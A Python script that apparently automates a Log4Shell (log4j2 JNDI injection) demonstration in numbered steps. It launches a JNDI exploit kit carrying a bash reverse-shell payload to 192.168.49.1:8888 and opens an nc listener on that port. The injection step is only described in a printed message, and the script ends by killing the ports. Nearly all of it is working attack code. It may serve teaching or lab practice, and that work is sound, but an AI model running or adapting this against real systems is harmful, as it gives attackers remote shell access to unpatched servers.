import subprocess
import pyppeteer
import re

print("\033[93m[STEP 1]\033[0m: Initializing exploit kit.")
print("The exploit kit will generate a link. When the target server accesses this link via JNDI, the payload will be deployed.")
print("In our case, the payload is a reverse shell.")

p_exploit_kit = subprocess.Popen(
    [
        "java",
        "-jar",
        "JNDI-Exploit-Kit-1.0-SNAPSHOT-all.jar",
        "-C",
        "bash -i >& /dev/tcp/192.168.49.1/8888 0>&1",
    ],
    stdout=subprocess.PIPE,
    stderr=subprocess.STDOUT
)

code = False
link = None
for line in p_exploit_kit.stdout:
    if "SpringBoot" in line.decode():
        code = True
        continue
    if code:
        link = line.decode()
        break

ansi_escape = re.compile(r'\x1B(?:[@-Z\\-_]|\[[0-?]*[ -/]*[@-~])')
link = ansi_escape.sub('', link)
print("Generated link:", link)
input("Press Enter to continue...")

print("\033[93m[STEP 2]\033[0m: Listen for reverse shell connection.")
print("Since our payload will create a reverse shell that connects to our (attacker) server at port 8888, we will listen to port 8888.")

p_listener = subprocess.Popen(
    [
        "nc",
        "-lnvp",
        "8888"
    ],
    stdout=subprocess.PIPE,
    stderr=subprocess.STDOUT
)

input("Press Enter to continue...")

print("\033[93m[STEP 3]\033[0m: Perform JNDI Injection.")
print("We will now visit a webpage on the target server, and insert the generated link into a vulnerable field.")
print("A field is vulnerable when we pass its contents to unpatched log4j2 logger.")

subprocess.run(["fuser", "-k", "8888/tcp"])
subprocess.run(["fuser", "-k", "1389/tcp"])